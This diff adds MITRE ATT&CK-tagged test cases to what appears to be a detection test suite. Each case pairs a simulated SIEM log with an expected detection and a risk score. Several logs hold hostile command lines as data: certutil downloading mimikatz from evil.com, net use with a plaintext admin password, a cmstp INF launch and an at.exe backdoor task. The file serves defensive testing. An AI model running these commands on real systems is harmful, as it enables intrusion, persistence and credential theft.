@@ -553,5 +553,149 @@
     },
     "expected_detection": true,
     "min_risk": 90
+  },
+  {
+    "id": "T1548-001",
+    "name": "Bypass UAC via Event Viewer",
+    "description": "Uses Event Viewer to bypass UAC and gain elevated privileges",
+    "tactic": "privilege_escalation",
+    "technique": "T1548.002",
+    "payload": {
+      "task_type": "privilege_escalation_detection",
+      "severity": "high",
+      "siem_event": {
+        "raw_log": "eventvwr.exe launching powershell.exe with elevated privileges via registry hijack",
+        "source_ip": "10.0.0.80",
+        "username": "user"
+      }
+    },
+    "expected_detection": true,
+    "min_risk": 80
+  },
+  {
+    "id": "T1036-001",
+    "name": "Masquerading as Legitimate Process",
+    "description": "Renames malware to appear as legitimate Windows process",
+    "tactic": "defense_evasion",
+    "technique": "T1036",
+    "payload": {
+      "task_type": "defense_evasion_detection",
+      "severity": "medium",
+      "siem_event": {
+        "raw_log": "svchost.exe executing from C:\\Users\\Public\\svchost.exe (not System32)",
+        "source_ip": "10.0.0.81",
+        "username": "user"
+      }
+    },
+    "expected_detection": true,
+    "min_risk": 70
+  },
+  {
+    "id": "T1021-002",
+    "name": "SMB/Windows Admin Shares",
+    "description": "Uses SMB admin shares for lateral movement",
+    "tactic": "lateral_movement",
+    "technique": "T1021.002",
+    "payload": {
+      "task_type": "lateral_movement_detection",
+      "severity": "high",
+      "siem_event": {
+        "raw_log": "net use \\10.0.0.82\\ADMIN$ /user:DOMAIN\\admin P@ssw0rd!",
+        "source_ip": "10.0.0.83",
+        "destination_ip": "10.0.0.82"
+      }
+    },
+    "expected_detection": true,
+    "min_risk": 75
+  },
+  {
+    "id": "T1218-001",
+    "name": "Signed Binary Proxy Execution - CMSTP",
+    "description": "Uses CMSTP.exe to execute malicious code via INF file",
+    "tactic": "defense_evasion",
+    "technique": "T1218.003",
+    "payload": {
+      "task_type": "defense_evasion_detection",
+      "severity": "high",
+      "siem_event": {
+        "raw_log": "cmstp.exe /s C:\\temp\\malicious.inf",
+        "source_ip": "10.0.0.84",
+        "username": "user"
+      }
+    },
+    "expected_detection": true,
+    "min_risk": 80
+  },
+  {
+    "id": "T1105-001",
+    "name": "Ingress Tool Transfer via CertUtil",
+    "description": "Downloads tools using certutil.exe download capability",
+    "tactic": "command_and_control",
+    "technique": "T1105",
+    "payload": {
+      "task_type": "c2_detection",
+      "severity": "high",
+      "siem_event": {
+        "raw_log": "certutil.exe -urlcache -split -f https://evil.com/mimikatz.exe C:\\temp\\m.exe",
+        "source_ip": "10.0.0.85",
+        "username": "user"
+      }
+    },
+    "expected_detection": true,
+    "min_risk": 85
+  },
+  {
+    "id": "T1053-005",
+    "name": "Scheduled Task/Job - At",
+    "description": "Creates scheduled task using at.exe for persistence",
+    "tactic": "persistence",
+    "technique": "T1053.002",
+    "payload": {
+      "task_type": "persistence_detection",
+      "severity": "medium",
+      "siem_event": {
+        "raw_log": "at.exe 23:00 /every:M,T,W,Th,F C:\\temp\\backdoor.exe",
+        "source_ip": "10.0.0.86",
+        "username": "admin"
+      }
+    },
+    "expected_detection": true,
+    "min_risk": 65
+  },
+  {
+    "id": "T1087-001",
+    "name": "Account Discovery - Local Accounts",
+    "description": "Enumerates local user accounts using net.exe",
+    "tactic": "discovery",
+    "technique": "T1087.001",
+    "payload": {
+      "task_type": "discovery_detection",
+      "severity": "low",
+      "siem_event": {
+        "raw_log": "net.exe user && net.exe localgroup administrators",
+        "source_ip": "10.0.0.87",
+        "username": "user"
+      }
+    },
+    "expected_detection": true,
+    "min_risk": 50
+  },
+  {
+    "id": "T1486-001",
+    "name": "Data Encrypted for Impact",
+    "description": "Ransomware encrypts files and drops ransom note",
+    "tactic": "impact",
+    "technique": "T1486",
+    "payload": {
+      "task_type": "ransomware_detection",
+      "severity": "critical",
+      "siem_event": {
+        "raw_log": "README_DECRYPT.txt created: Your files have been encrypted. Pay 2 BTC to wallet...",
+        "source_ip": "10.0.0.88",
+        "username": "SYSTEM"
+      }
+    },
+    "expected_detection": true,
+    "min_risk": 95
   }
 ]
